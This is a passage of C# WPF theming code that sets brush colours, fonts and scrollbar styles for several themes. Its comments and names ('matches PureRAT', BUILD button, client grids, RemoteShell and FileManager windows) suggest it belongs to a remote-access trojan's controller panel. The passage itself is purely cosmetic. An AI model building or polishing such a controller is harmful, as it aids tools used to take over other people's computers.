                res["BtnFgBrush"]              = B("#1A1A2E");
                res["AlternatingRowBgBrush"]   = B("#E8EFF8");
                res["RowHoverBgBrush"]         = B("#D4E4F4");
                res["RowSelBgBrush"]           = B("#ACCCE8");
                res["RowSelTextBrush"]         = B("#0E1A30");
                res["RowSelBorderBrush"]       = B("#3E6FA8");
                res["ColHeaderBgBrush"]        = B("#C8DCF0");
                res["ColHeaderFgBrush"]        = B("#1A1A2E");
                res["ColHeaderBorderBrush"]    = B("#8AAED4");
                break;

            case "MetropolisDark":
                res["NavIconBrush"]            = B("#9AAAD0");
                res["NavTextBrush"]            = B("#7888B8");
                res["NavHoverBgBrush"]         = B("#1E2848");
                res["NavHoverIconBrush"]       = B("#8898C8");
                res["NavHoverTextBrush"]       = B("#A0B0D0");
                res["NavSelBgBrush"]           = B("#2A4070");
                res["NavSelTextBrush"]         = B("#FFFFFF");
                res["NavSelIconBrush"]         = B("#5588D8");
                res["NavSectionBrush"]         = B("#3A4870");
                res["SidebarCtrlBgBrush"]      = B("#101520");
                res["SidebarCtrlBorderBrush"]  = B("#1A2038");
                res["SidebarCtrlTextBrush"]    = B("#6878A8");
                res["WindowBgBrush"]           = B("#1C2030");
                res["TitleBgBrush"]            = B("#242838");
                res["TitleBorderBrush"]        = B("#181C2C");
                res["SectionBgBrush"]          = B("#1F2434");
                res["SectionBorderBrush"]      = B("#2A3048");
                res["ActivityBgBrush"]         = B("#1C2030");
                res["InputBgBrush"]            = B("#161B28");
                res["InputBorderBrush"]        = B("#242A40");
                res["ContentTextBrush"]        = B("#B8C0D8");
                res["LabelBrush"]              = B("#6878A8");
                res["FieldLabelBrush"]         = B("#5868A0");
                res["BtnBgBrush"]              = B("#1E2438");
                res["BtnBorderBrush"]          = B("#2A3050");
                res["BtnHoverBgBrush"]         = B("#263060");
                res["BtnHoverBorderBrush"]     = B("#4060A8");
                res["BtnPressedBgBrush"]       = B("#141820");
                res["BtnFgBrush"]              = B("#B8C0D8");
                res["ColHeaderBgBrush"]        = B("#1E2438");
                res["ColHeaderFgBrush"]        = B("#6878A8");
                res["ColHeaderBorderBrush"]    = B("#607090");
                break;

            case "Office2019HighContrast":
                res["NavIconBrush"]            = B("#FFFF00");
                res["NavTextBrush"]            = B("#FFFFFF");
                res["NavHoverBgBrush"]         = B("#002050");  // dark navy — yellow DX icons visible
                res["NavHoverIconBrush"]       = B("#FFFF00");  // match DX HC icon rendering
                res["NavHoverTextBrush"]       = B("#FFFFFF");
                res["NavSelBgBrush"]           = B("#000090");  // dark blue — yellow icons visible
                res["NavSelTextBrush"]         = B("#FFFFFF");
                res["NavSelIconBrush"]         = B("#FFFF00");  // match DX HC icon rendering
                res["NavSectionBrush"]         = B("#FFFF00");
                res["SidebarCtrlBgBrush"]      = B("#000000");
                res["SidebarCtrlBorderBrush"]  = B("#FFFFFF");
                res["SidebarCtrlTextBrush"]    = B("#FFFFFF");
                res["WindowBgBrush"]           = B("#000000");
                res["TitleBgBrush"]            = B("#000000");
                res["TitleBorderBrush"]        = B("#FFFFFF");
                res["SectionBgBrush"]          = B("#000000");
                res["SectionBorderBrush"]      = B("#FFFFFF");
                res["ActivityBgBrush"]         = B("#000000");
                res["InputBgBrush"]            = B("#000000");
                res["InputBorderBrush"]        = B("#FFFFFF");
                res["ContentTextBrush"]        = B("#FFFFFF");
                res["LabelBrush"]              = B("#FFFFFF");
                res["FieldLabelBrush"]         = B("#FFFFFF");
                res["BtnBgBrush"]              = B("#000000");
                res["BtnBorderBrush"]          = B("#FFFFFF");
                res["BtnHoverBgBrush"]         = B("#1A1A3A");  // dark hover — white text visible
                res["BtnHoverBorderBrush"]     = B("#FFFF00");
                res["BtnPressedBgBrush"]       = B("#808080");
                res["BtnFgBrush"]              = B("#FFFFFF");
                res["ColHeaderBgBrush"]        = B("#000000");
                res["ColHeaderFgBrush"]        = B("#FFFF00");
                res["ColHeaderBorderBrush"]    = B("#FFFFFF");
                break;

            // ══════════════════════════════════════════════════════════════════
            // THEMATIC — SEVEN CLASSIC (Windows 7 Aero style — matches PureRAT)
            // ══════════════════════════════════════════════════════════════════
            case "Seven":
                res["NavIconBrush"]            = B("#4A6A94");
                res["NavTextBrush"]            = B("#1E3050");
                {
                    // Nav selection: Windows 7 Aero glass gradient (shiny top highlight + blue body)
                    System.Windows.Media.LinearGradientBrush AeroGrad(string c0, string c1, string c2, string c3)
                    {
                        var g = new System.Windows.Media.LinearGradientBrush
                        {
                            StartPoint = new System.Windows.Point(0, 0),
                            EndPoint   = new System.Windows.Point(0, 1)
                        };
                        System.Windows.Media.Color C(string h) => (System.Windows.Media.Color)
                            System.Windows.Media.ColorConverter.ConvertFromString(h);
                        g.GradientStops.Add(new System.Windows.Media.GradientStop(C(c0), 0.00));
                        g.GradientStops.Add(new System.Windows.Media.GradientStop(C(c1), 0.44));
                        g.GradientStops.Add(new System.Windows.Media.GradientStop(C(c2), 0.45));
                        g.GradientStops.Add(new System.Windows.Media.GradientStop(C(c3), 1.00));
                        g.Freeze();
                        return g;
                    }
                    // Selection: bright top shine → rich blue body → lighter bottom (Win7 Aero)
                    res["NavSelBgBrush"]   = AeroGrad("#EAF4FF", "#B8DAFA", "#7ABAE8", "#AACEF8");
                    // Hover: very subtle blue tint
                    res["NavHoverBgBrush"] = AeroGrad("#F4FAFF", "#E4F2FF", "#D8ECFC", "#E4F2FF");

                    // Win7-style gradient buttons — 4-stop shiny look
                    System.Windows.Media.LinearGradientBrush BtnGrad4(string h0, string h1, string h2, string h3)
                    {
                        var gr = new System.Windows.Media.LinearGradientBrush();
                        gr.StartPoint = new System.Windows.Point(0, 0);
                        gr.EndPoint   = new System.Windows.Point(0, 1);
                        gr.GradientStops.Add(new System.Windows.Media.GradientStop(
                            (System.Windows.Media.Color)System.Windows.Media.ColorConverter.ConvertFromString(h0), 0.0));
                        gr.GradientStops.Add(new System.Windows.Media.GradientStop(
                            (System.Windows.Media.Color)System.Windows.Media.ColorConverter.ConvertFromString(h1), 0.49));
                        gr.GradientStops.Add(new System.Windows.Media.GradientStop(
                            (System.Windows.Media.Color)System.Windows.Media.ColorConverter.ConvertFromString(h2), 0.5));
                        gr.GradientStops.Add(new System.Windows.Media.GradientStop(
                            (System.Windows.Media.Color)System.Windows.Media.ColorConverter.ConvertFromString(h3), 1.0));
                        gr.Freeze();
                        return gr;
                    }
                    // Normal: light cool-gray shiny
                    res["BtnBgBrush"]        = BtnGrad4("#F4F6FA", "#DFE6F0", "#D2DCEB", "#E6EEF8");
                    // Hover: blue Aero tint
                    res["BtnHoverBgBrush"]   = BtnGrad4("#EAF3FF", "#C8E0FF", "#AECFF8", "#D4EAFF");
                    // Pressed: slight invert/darken
                    res["BtnPressedBgBrush"] = BtnGrad4("#C4D4E8", "#D8E6F8", "#CCDEF4", "#DCEAFF");
                    // Primary action (START/BUILD/CHECK/APPLY) — Win7 Aero vivid blue gradient
                    res["BtnPrimaryBgBrush"] = BtnGrad4("#5CB8F0", "#2E8ED8", "#1A74C8", "#4AACEC");
                    res["SectionBgBrush"]    = B("#FFFFFF");
                    res["ActivityBgBrush"]   = B("#F5F8FC");
                }
                res["NavHoverIconBrush"]       = B("#2A4A78");
                res["NavHoverTextBrush"]       = B("#1A2840");
                res["NavSelTextBrush"]         = B("#0E2848");
                res["NavSelIconBrush"]         = B("#7AB8E8");
                res["NavSectionBrush"]         = B("#0D3878");
                res["SidebarCtrlBgBrush"]      = B("#EDF4FB");
                res["SidebarCtrlBorderBrush"]  = B("#C8DBF0");
                res["SidebarCtrlTextBrush"]    = B("#2A4A6A");
                res["WindowBgBrush"]           = B("#FFFFFF");
                // Feature windows: light Aero glass (not the dark DX title bar blue)
                res["TitleBgBrush"]            = B("#EEF3FA");
                res["TitleBorderBrush"]        = B("#C4D4E8");
                // Light title needs dark text — override the global _lightTitleThemes white
                res["TitleTextBrush"]          = B("#1A3050");
                Resources["TitleTextBrush"]    = B("#1A3050");
                res["SectionBorderBrush"]      = B("#A8C8E8");
                res["InputBgBrush"]            = B("#FFFFFF");
                res["InputBorderBrush"]        = B("#A4BAD6");
                res["ContentTextBrush"]        = B("#1A2840");
                res["LabelBrush"]              = B("#4A6080");
                res["FieldLabelBrush"]         = B("#607090");
                res["BtnBorderBrush"]          = B("#AABDD4");
                res["BtnHoverBorderBrush"]     = B("#4A8CC8");
                res["BtnFgBrush"]              = B("#1A2840");
                res["AlternatingRowBgBrush"]   = B("#EBF2FA");
                res["RowHoverBgBrush"]         = B("#D0E8FA");
                res["RowSelBgBrush"]           = B("#A8D4F8");
                res["RowSelTextBrush"]         = B("#0A1E38");
                res["RowSelBorderBrush"]       = B("#4090D0");
                res["ColHeaderBgBrush"]        = B("#C4D8F0");
                res["ColHeaderFgBrush"]        = B("#0E2848");
                res["ColHeaderBorderBrush"]    = B("#8ABCDC");
                break;

            // ══════════════════════════════════════════════════════════════════
            // DEFAULT — SeroDark (+ variant accent colours)
            // ══════════════════════════════════════════════════════════════════
            default:
                // SeroDark — flat dark aesthetic, no card borders, section contrast via bg elevation
                res["NavIconBrush"]            = B("#9AAAD0");    // brighter icons
                res["NavTextBrush"]            = B("#8090B8");    // brighter, clearly readable text
                res["NavHoverBgBrush"]         = B("#12152E");
                res["NavHoverIconBrush"]       = B("#90A0C8");
                res["NavHoverTextBrush"]       = B("#B0C0DC");
                res["NavSelBgBrush"]           = B("#111630");
                res["NavSelTextBrush"]         = B("#E0E4F8");
                res["NavSelIconBrush"]         = B(accentHex);
                res["NavSectionBrush"]         = B("#4A5590");    // brighter section labels
                res["SidebarBgBrush"]          = B("#0D0F1E");
                res["SidebarBorderBrush"]      = B("#0A0C17");    // same as window bg → invisible sidebar divider
                res["SidebarCtrlBgBrush"]      = B("#0C0D18");
                res["SidebarCtrlBorderBrush"]  = B("#181A30");
                res["SidebarCtrlTextBrush"]    = B("#8090B0");
                res["WindowBgBrush"]           = B("#0A0C17");
                res["TitleBgBrush"]            = B("#0C0E1C");
                res["TitleBorderBrush"]        = B("#0A0C17");    // invisible title border
                res["SectionBgBrush"]          = B("#10132A");    // elevated vs window — visible without border
                res["SectionBorderBrush"]      = B("#0A0C17");    // same as window bg → no card border
                res["ActivityBgBrush"]         = B("#0A0C17");
                res["InputBgBrush"]            = B("#07080F");
                res["InputBorderBrush"]        = B("#10132A");    // same as SectionBgBrush → no visible control borders
                res["ContentTextBrush"]        = B("#E0E4F8");    // bright readable text
                res["LabelBrush"]              = B("#A8B4D0");
                res["FieldLabelBrush"]         = B("#8090B8");
                res["BtnBgBrush"]              = B("#10131E");
                res["BtnBorderBrush"]          = B("#1C2248");
                res["BtnHoverBgBrush"]         = B("#161A30");
                res["BtnHoverBorderBrush"]     = B("#2E3660");
                res["BtnPressedBgBrush"]       = B("#08091A");
                res["BtnFgBrush"]              = B("#E0E4F8");
                res["ColHeaderBgBrush"]        = B("#0D0E1A");
                res["ColHeaderFgBrush"]        = B("#8090B8");
                res["ColHeaderBorderBrush"]    = B("#606888");
                res["WindowOutlineBrush"]      = B("#1E2038");   // navy inner border matching SeroDark palette
                res["WindowOutlineThickness"]  = new System.Windows.Thickness(1);
                break;

            // ══════════════════════════════════════════════════════════════════
            // VECTOR
            // ══════════════════════════════════════════════════════════════════
            case "TheBezier":
                res["NavIconBrush"]            = B("#9AAAD0");
                res["NavTextBrush"]            = B("#8090B8");
                res["NavHoverBgBrush"]         = B("#2A3050");
                res["NavHoverIconBrush"]       = B("#90A0C8");
                res["NavHoverTextBrush"]       = B("#C0D0E8");
                res["NavSelBgBrush"]           = B("#3E6FA8");
                res["NavSelTextBrush"]         = B("#FFFFFF");
                res["NavSelIconBrush"]         = B("#FFFFFF");
                res["NavSectionBrush"]         = B("#505878");
                res["SidebarBgBrush"]          = B("#252A38");    // explicit — prevents DX async bleed
                res["SidebarBorderBrush"]      = B("#1C1E30");
                res["SidebarCtrlBgBrush"]      = B("#1E2238");
                res["SidebarCtrlBorderBrush"]  = B("#2A3050");
                res["SidebarCtrlTextBrush"]    = B("#8090B0");
                res["WindowBgBrush"]           = B("#2C303A");
                res["TitleBgBrush"]            = B("#20242E");
                res["TitleBorderBrush"]        = B("#181C26");
                res["SectionBgBrush"]          = B("#343840");
                res["SectionBorderBrush"]      = B("#404860");
                res["ActivityBgBrush"]         = B("#2C303A");
                res["InputBgBrush"]            = B("#252830");
                res["InputBorderBrush"]        = B("#3A4060");
                res["ContentTextBrush"]        = B("#D0D8E8");
                res["LabelBrush"]              = B("#8890A8");
                res["FieldLabelBrush"]         = B("#7080A0");
                res["BtnBgBrush"]              = B("#343840");
                res["BtnBorderBrush"]          = B("#484E68");
                res["BtnHoverBgBrush"]         = B("#3C4050");
                res["BtnHoverBorderBrush"]     = B("#6070A0");
                res["BtnPressedBgBrush"]       = B("#282C38");
                res["BtnFgBrush"]              = B("#D0D8E8");
                res["ColHeaderBgBrush"]        = B("#1E2238");
                res["ColHeaderFgBrush"]        = B("#7880A0");
                res["ColHeaderBorderBrush"]    = B("#606888");
                break;

        }

        // Auto-derive ColHeaderHoverBrush from ColHeaderBgBrush.
        // Dark headers (avg brightness < 128) lighten by +30 RGB; light headers darken by -25 RGB.
        // Larger delta than before (+20/-18) ensures the hover is noticeable on all themes.
        if (res["ColHeaderBgBrush"] is System.Windows.Media.SolidColorBrush colHdrBg)
        {
            var hc = colHdrBg.Color;
            int hBri = (hc.R + hc.G + hc.B) / 3;
            var hoverColor = hBri < 128
                ? System.Windows.Media.Color.FromRgb(
                    (byte)Math.Min(hc.R + 30, 255),
                    (byte)Math.Min(hc.G + 30, 255),
                    (byte)Math.Min(hc.B + 30, 255))
                : System.Windows.Media.Color.FromRgb(
                    (byte)Math.Max(hc.R - 25, 0),
                    (byte)Math.Max(hc.G - 25, 0),
                    (byte)Math.Max(hc.B - 25, 0));
            var hoverBrush = new System.Windows.Media.SolidColorBrush(hoverColor);
            hoverBrush.Freeze();
            res["ColHeaderHoverBrush"] = hoverBrush;

            // Auto-derive ColSeparatorBrush: guaranteed contrast against the header background.
            // Dark bg (avg < 128): lighten by +90; light bg: darken by -80. Both clamped to [0,255].
            var sepColor = hBri < 128
                ? System.Windows.Media.Color.FromRgb(
                    (byte)Math.Min(hc.R + 90, 255),
                    (byte)Math.Min(hc.G + 90, 255),
                    (byte)Math.Min(hc.B + 90, 255))
                : System.Windows.Media.Color.FromRgb(
                    (byte)Math.Max(hc.R - 80, 0),
                    (byte)Math.Max(hc.G - 80, 0),
                    (byte)Math.Max(hc.B - 80, 0));
            var sepBrush = new System.Windows.Media.SolidColorBrush(sepColor);
            sepBrush.Freeze();
            res["ColSeparatorBrush"] = sepBrush;

            // ColAccentBarBrush — bottom line on every column header.
            // Dark themes (aurora bar visible): accent color, contrast-shifted if too close to header bg.
            // Light themes (no aurora bar): neutral separator tone — same ColSeparatorBrush color so the
            // bar is distinguishable without looking like a coloured accent.
            if (_lightThemeKeys.Contains(name))
            {
                // Reuse separator color (already computed as -80 contrast vs header bg)
                res["ColAccentBarBrush"] = res["ColSeparatorBrush"];
            }
            else if (res["AccentBrush"] is System.Windows.Media.SolidColorBrush acBr)
            {
                var ac = acBr.Color;
                int acBri = (ac.R + ac.G + ac.B) / 3;
                System.Windows.Media.Color barColor;
                if (Math.Abs(hBri - acBri) < 35)
                {
                    barColor = hBri < 128
                        ? System.Windows.Media.Color.FromRgb(
                            (byte)Math.Min(ac.R + 70, 255),
                            (byte)Math.Min(ac.G + 70, 255),
                            (byte)Math.Min(ac.B + 70, 255))
                        : System.Windows.Media.Color.FromRgb(
                            (byte)Math.Max(ac.R - 70, 0),
                            (byte)Math.Max(ac.G - 70, 0),
                            (byte)Math.Max(ac.B - 70, 0));
                }
                else
                {
                    barColor = ac;
                }
                var barBrush = new System.Windows.Media.SolidColorBrush(barColor);
                barBrush.Freeze();
                res["ColAccentBarBrush"] = barBrush;
            }
        }

        // Auto-derive card/chart/progress colors from the window background brightness.
        // Light themes get tinted light cards; dark themes keep the deep dark cards.
        if (res["WindowBgBrush"] is System.Windows.Media.SolidColorBrush wb)
        {
            var wc = wb.Color;
            int brightness = (wc.R + wc.G + wc.B) / 3;
            if (brightness > 100)
            {
                // Light themes: cards use SectionBgBrush (content-area white/near-white),
                // chart uses WindowBgBrush (slightly grey outer area), track is a darker stripe.
                var sec = res.Contains("SectionBgBrush")
                    ? ((System.Windows.Media.SolidColorBrush)res["SectionBgBrush"]).Color
                    : System.Windows.Media.Color.FromRgb(255, 255, 255);
                var cardBrush  = new System.Windows.Media.SolidColorBrush(sec); cardBrush.Freeze();
                var chartColor = System.Windows.Media.Color.FromRgb(
                    (byte)Math.Max(wc.R - 8,  200),
                    (byte)Math.Max(wc.G - 6,  202),
                    (byte)Math.Max(wc.B - 3,  205));
                var chartBrush = new System.Windows.Media.SolidColorBrush(chartColor); chartBrush.Freeze();
                var trackColor = System.Windows.Media.Color.FromRgb(
                    (byte)Math.Max(wc.R - 28, 185),
                    (byte)Math.Max(wc.G - 22, 188),
                    (byte)Math.Max(wc.B - 12, 196));
                var trackBrush = new System.Windows.Media.SolidColorBrush(trackColor); trackBrush.Freeze();
                res["CardBgBrush"]           = cardBrush;
                res["ChartBgBrush"]          = chartBrush;
                res["ProgressTrackBrush"]    = trackBrush;
                // Light themes: subtle alternating stripe
                var altBrushL = new System.Windows.Media.SolidColorBrush(
                    System.Windows.Media.Color.FromArgb(0x18, color.R, color.G, color.B));
                altBrushL.Freeze();
                res["AlternatingRowBgBrush"] = altBrushL;

                // Light theme row hover: subtle single-layer tint (cell only, no row duplication)
                var hoverBrushL = new System.Windows.Media.SolidColorBrush(
                    System.Windows.Media.Color.FromArgb(0x26, color.R, color.G, color.B));
                hoverBrushL.Freeze();
                res["RowHoverBgBrush"] = hoverBrushL;
                // Light theme row selection: much more opaque so selected > hover clearly
                var selGradL = new System.Windows.Media.LinearGradientBrush(
                    System.Windows.Media.Color.FromArgb(0x90, color.R, color.G, color.B),
                    System.Windows.Media.Color.FromArgb(0xC0, color.R, color.G, color.B),
                    new System.Windows.Point(0.5, 0), new System.Windows.Point(0.5, 1));
                selGradL.Freeze();
                res["RowSelBgBrush"]     = selGradL;
                // Selection text: always dark
                res["RowSelTextBrush"]   = B("#0A1428");
                res["RowSelBorderBrush"] = accentBrush;

                // Light theme flag unknown: light gray so it shows against light backgrounds
                res["FlagUnknownBrush"] = B("#A0A8B8");
            }
            else
            {
                // Dark themes: derive from SectionBgBrush + a small increment so cards appear
                // slightly elevated (lighter) above the section background, not sunken into it.
                byte cR, cG, cB;
                if (name == "SeroDark")
                {
                    cR = 0x1A; cG = 0x1C; cB = 0x31;   // #1A1C31 — elevated above #10132A SectionBg
                }
                else
                {
                    var sc = res.Contains("SectionBgBrush")
                        ? ((System.Windows.Media.SolidColorBrush)res["SectionBgBrush"]).Color
                        : wc;
                    cR = (byte)Math.Min(sc.R + 10, 255);
                    cG = (byte)Math.Min(sc.G + 9,  255);
                    cB = (byte)Math.Min(sc.B + 7,  255);
                }
                var dCardBrush  = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(cR, cG, cB)); dCardBrush.Freeze();
                var dChartBrush = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb((byte)Math.Max(cR-8,0),(byte)Math.Max(cG-7,0),(byte)Math.Max(cB-5,0))); dChartBrush.Freeze();
                var dTrackBrush = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb((byte)Math.Max(cR-18,0),(byte)Math.Max(cG-15,0),(byte)Math.Max(cB-10,0))); dTrackBrush.Freeze();
                res["CardBgBrush"]           = dCardBrush;
                res["ChartBgBrush"]          = dChartBrush;
                res["ProgressTrackBrush"]    = dTrackBrush;
                // Dark themes: subtle accent-tinted stripe for alternating rows
                var altBrushD = new System.Windows.Media.SolidColorBrush(
                    System.Windows.Media.Color.FromArgb(0x18, color.R, color.G, color.B));
                altBrushD.Freeze();
                res["AlternatingRowBgBrush"] = altBrushD;

                // Dark theme row hover: single-layer tint, kept subtle so selection stands out more
                var hoverBrushD = new System.Windows.Media.SolidColorBrush(
                    System.Windows.Media.Color.FromArgb(0x30, color.R, color.G, color.B));
                hoverBrushD.Freeze();
                res["RowHoverBgBrush"] = hoverBrushD;
                // Dark theme row selection: strong opaque gradient — clearly more prominent than hover
                var selGradD = new System.Windows.Media.LinearGradientBrush(
                    System.Windows.Media.Color.FromArgb(0xE8, color.R, color.G, color.B),
                    System.Windows.Media.Color.FromArgb(0xC0, color.R, color.G, color.B),
                    new System.Windows.Point(0.5, 0), new System.Windows.Point(0.5, 1));
                selGradD.Freeze();
                res["RowSelBgBrush"] = selGradD;
                {
                    bool hasHue = Math.Max(color.R, Math.Max(color.G, color.B)) - Math.Min(color.R, Math.Min(color.G, color.B)) > 30
                                  && (color.R + color.G + color.B) > 100;
                    res["RowSelTextBrush"]   = hasHue ? B("#FFFFFF") : B("#C8D8EC");
                    res["RowSelBorderBrush"] = accentBrush;
                }

                // Dark theme flag unknown: medium gray that shows on dark backgrounds
                res["FlagUnknownBrush"] = B("#8A92A4");
            }
        }

        // HighContrast: yellow accent → black selection text for accessibility
        if (name == "Office2019HighContrast")
            res["RowSelTextBrush"] = B("#000000");

        // Swap ScrollBar implicit style: each classic theme gets its own wide scrollbar style;
        // all modern/dark themes get the thin modern scrollbar.
        try
        {
            string sbKey = name switch
            {
                "Seven"     => "ClassicScrollBarStyle",
                "WindowsXP" => "XPScrollBarStyle",
                "WXI"       => "NeutralScrollBarStyle",
                "Basic"     => "NeutralScrollBarStyle",
                _           => "ModernScrollBarStyle"
            };
            Resources[typeof(System.Windows.Controls.Primitives.ScrollBar)] =
                (System.Windows.Style)FindResource(sbKey);
        }
        catch { /* resource not found — keep current style */ }

        // Sync all theme brushes to window-level resources.
        // Window.Resources shadows Application.Current.Resources in DynamicResource lookup,
        // so updates to App.Resources alone are not visible to DynamicResource bindings inside this window.
        var wRes = Resources;
        foreach (var key in new[]
        {
            "AccentBrush", "AccentColor",
            "SidebarBgBrush", "SidebarBorderBrush",
            "NavIconBrush", "NavTextBrush", "NavHoverBgBrush", "NavHoverIconBrush",
            "NavHoverTextBrush", "NavSelBgBrush", "NavSelTextBrush", "NavSelIconBrush",
            "NavSectionBrush", "SidebarCtrlBgBrush", "SidebarCtrlBorderBrush", "SidebarCtrlTextBrush",
            "WindowBgBrush", "TitleBgBrush", "TitleBorderBrush", "SectionBgBrush", "SectionBorderBrush",
            "ActivityBgBrush", "InputBgBrush", "InputBorderBrush", "ContentTextBrush", "LabelBrush",
            "FieldLabelBrush", "BtnBgBrush", "BtnBorderBrush", "BtnHoverBgBrush", "BtnHoverBorderBrush",
            "BtnPressedBgBrush", "BtnFgBrush", "BtnPrimaryBgBrush", "CardBgBrush", "ChartBgBrush", "ProgressTrackBrush",
            "ColHeaderBgBrush", "ColHeaderFgBrush", "ColHeaderBorderBrush", "ColHeaderHoverBrush", "ColSeparatorBrush", "ColAccentBarBrush",
            "AlternatingRowBgBrush", "RowSelBgBrush", "RowSelTextBrush", "RowSelBorderBrush", "FlagUnknownBrush",
            "ContainerCornerRadius"
        })
            if (res.Contains(key)) wRes[key] = res[key];

        // Row selection and hover — unified across ServerWindow and all feature windows.
        // SystemColors.HighlightColor matches the rubber-band selection rectangle on every theme.
        var hl = System.Windows.SystemColors.HighlightColor;
        {
            var selBrushSync = new System.Windows.Media.SolidColorBrush(
                System.Windows.Media.Color.FromArgb(0x90, hl.R, hl.G, hl.B));
            selBrushSync.Freeze();
            wRes["RowSelBgBrush"]                       = selBrushSync;
            Application.Current.Resources["RowSelBgBrush"] = selBrushSync;

            var selBorderBrush = new System.Windows.Media.SolidColorBrush(hl);
            wRes["RowSelBorderBrush"]                       = selBorderBrush;
            Application.Current.Resources["RowSelBorderBrush"] = selBorderBrush;

            wRes["RowBorderThicknessKey"] = new System.Windows.Thickness(0);

            var hoverBrushSync = new System.Windows.Media.SolidColorBrush(
                System.Windows.Media.Color.FromArgb(0x20, hl.R, hl.G, hl.B));
            hoverBrushSync.Freeze();
            wRes["RowHoverBgBrush"]                       = hoverBrushSync;
            Application.Current.Resources["RowHoverBgBrush"] = hoverBrushSync;

            // RowSelTextBrush: dark on light themes, white on dark themes
            var selText = _lightThemeKeys.Contains(name) ? B("#0A1E38") : B("#FFFFFF");
            wRes["RowSelTextBrush"]                       = selText;
            Application.Current.Resources["RowSelTextBrush"] = selText;
        }
        if (name == "Office2019HighContrast")
        {
            wRes["RowSelTextBrush"]                       = B("#000000");
            Application.Current.Resources["RowSelTextBrush"] = B("#000000");
        }

        // Per-theme font family — cascades to all window content via WPF inheritance.
        // Consolas for dark/technical themes, Calibri for Office suites, Segoe UI elsewhere.
        var fontFamilyName = name switch
        {
            "SeroDark" or "VS2017Dark" or "TheBezier" => "Consolas",
            var n when n.StartsWith("Office2013") || n.StartsWith("Office2016") || n.StartsWith("Office2019") => "Calibri",
            _ => "Segoe UI"
        };
        var themeFontFamily = new System.Windows.Media.FontFamily(fontFamilyName);
        res["ThemeFontFamily"]  = themeFontFamily;
        wRes["ThemeFontFamily"] = themeFontFamily;
        this.FontFamily = themeFontFamily;

        // Adapt SGreenBtn gradient to accent color so START button follows the theme.
        var c2grad = System.Windows.Media.Color.FromRgb(
            (byte)Math.Max(color.R - 30, 0),
            (byte)Math.Min(color.G + 10, 255),
            (byte)Math.Min(color.B + 40, 255));
        var grad = new System.Windows.Media.LinearGradientBrush
        {
            StartPoint = new System.Windows.Point(0, 0),
            EndPoint   = new System.Windows.Point(1, 0)
        };
        grad.GradientStops.Add(new System.Windows.Media.GradientStop(color, 0));
        grad.GradientStops.Add(new System.Windows.Media.GradientStop(c2grad, 1));
        grad.Freeze();
        res["PrimaryGradient"]  = grad;
        wRes["PrimaryGradient"] = grad;

        // Apply gradient as primary button background (themes that already set their own gradient are unaffected)
        if (res["BtnPrimaryBgBrush"] is System.Windows.Media.SolidColorBrush)
        {
            res["BtnPrimaryBgBrush"]  = grad;
            wRes["BtnPrimaryBgBrush"] = grad;
        }

        // Adapt aurora bar gradient stops to accent-derived palette
        if (AuroraBar?.Fill is System.Windows.Media.LinearGradientBrush auroraFill
            && !auroraFill.IsFrozen
            && auroraFill.GradientStops.Count >= 7)
        {
            var cCyan = System.Windows.Media.Color.FromRgb(
                (byte)Math.Max(color.R - 20, 0),
                (byte)Math.Min(color.G + 60, 255),
                (byte)Math.Min(color.B + 50, 255));
            var cMid = System.Windows.Media.Color.FromRgb(
                (byte)Math.Min(color.R + 20, 255),
                (byte)Math.Max(color.G - 30, 0),
                (byte)Math.Min(color.B + 15, 255));
            var cPurple = System.Windows.Media.Color.FromRgb(
                (byte)Math.Min(color.R + 90, 255),
                (byte)Math.Max(color.G - 80, 0),
                (byte)Math.Min(color.B + 60, 255));
            auroraFill.GradientStops[0].Color = color;
            auroraFill.GradientStops[1].Color = cCyan;
            auroraFill.GradientStops[2].Color = cMid;
            auroraFill.GradientStops[3].Color = cPurple;
            auroraFill.GradientStops[4].Color = cMid;
            auroraFill.GradientStops[5].Color = cCyan;
            auroraFill.GradientStops[6].Color = color;
        }

        // Container corner radius — sharp for classic themes, subtle rounding for modern ones
        var containerRadius = name switch
        {
            "Seven"                              => new System.Windows.CornerRadius(0),
            "SeroDark" or "TheBezier" or "VS2017Dark" => new System.Windows.CornerRadius(3),
            _                                    => new System.Windows.CornerRadius(3)
        };
        res["ContainerCornerRadius"]  = containerRadius;
        wRes["ContainerCornerRadius"] = containerRadius;

        // Full-height scrollbar template: clear for Seven Classic (theme metrics conflict),
        // apply for all other themes. Run at Loaded priority so DX has already settled.
        Dispatcher.InvokeAsync(() =>
        {
            if (GridAllClients == null) return;
            if (name == "Seven")
            {
                GridAllClients.ClearValue(System.Windows.Controls.DataGrid.TemplateProperty);
                GridClients.ClearValue(System.Windows.Controls.DataGrid.TemplateProperty);
            }
            else if (TryFindResource("DataGridFullHeightScrollbar") is System.Windows.Controls.ControlTemplate fhTpl)
            {
                GridAllClients.Template = fhTpl;
                GridClients.Template = fhTpl;
            }
        }, System.Windows.Threading.DispatcherPriority.Loaded);

        // Propagate all tokens to every open window so DynamicResource consumers
        // in feature windows (RemoteShell, FileManager, etc.) also update immediately.
        var allKeys = new[]
        {
            "AccentBrush", "AccentColor",
            "SidebarBgBrush", "SidebarBorderBrush",
            "NavIconBrush", "NavTextBrush", "NavHoverBgBrush", "NavHoverIconBrush",
            "NavHoverTextBrush", "NavSelBgBrush", "NavSelTextBrush", "NavSelIconBrush",
            "NavSectionBrush", "SidebarCtrlBgBrush", "SidebarCtrlBorderBrush", "SidebarCtrlTextBrush",
            "WindowBgBrush", "TitleBgBrush", "TitleBorderBrush", "SectionBgBrush", "SectionBorderBrush",
            "ActivityBgBrush", "InputBgBrush", "InputBorderBrush", "ContentTextBrush", "LabelBrush",
            "FieldLabelBrush", "BtnBgBrush", "BtnBorderBrush", "BtnHoverBgBrush", "BtnHoverBorderBrush",
            "BtnPressedBgBrush", "BtnFgBrush", "BtnPrimaryBgBrush", "CardBgBrush", "ChartBgBrush", "ProgressTrackBrush",
            "AlternatingRowBgBrush", "RowSelBgBrush", "RowSelTextBrush", "RowSelBorderBrush",
            "RowHoverBgBrush",
            "ColHeaderBgBrush", "ColHeaderFgBrush", "ColHeaderBorderBrush", "ColHeaderHoverBrush", "ColSeparatorBrush", "ColAccentBarBrush",
            "FlagUnknownBrush",
            "ThemeFontFamily", "PrimaryGradient",
            "WindowOutlineBrush", "WindowOutlineThickness",
            "ContainerCornerRadius"
        };
        foreach (Window w in Application.Current.Windows)
        {
            if (w == this) continue;
            var wr = w.Resources;
            foreach (var key in allKeys)
                if (res.Contains(key)) wr[key] = res[key];
